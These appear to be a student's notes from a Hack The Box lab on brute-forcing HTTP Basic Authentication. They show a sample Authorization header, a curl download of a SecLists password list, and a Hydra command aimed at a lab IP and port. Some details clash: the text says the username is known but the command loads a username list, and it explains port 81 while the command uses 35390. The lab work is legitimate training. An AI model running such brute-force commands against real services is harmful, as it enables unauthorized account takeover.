For example, the headers for Basic Auth in a HTTP GET request would look like:

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

`http-get` hydra service to brute force the basic authentication target.

We already know the username is `basic-auth-user`. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password

```bash
# Download wordlist if needed
AhmaDb0x@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
AhmaDb0x@htb[/htb]$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 94.237.51.14 http-get / -s 35390
```

the attack should be performed using HTTP GET requests to the root path ('/')
`-s 81`: This overrides the default port for the HTTP service and sets it to 81.
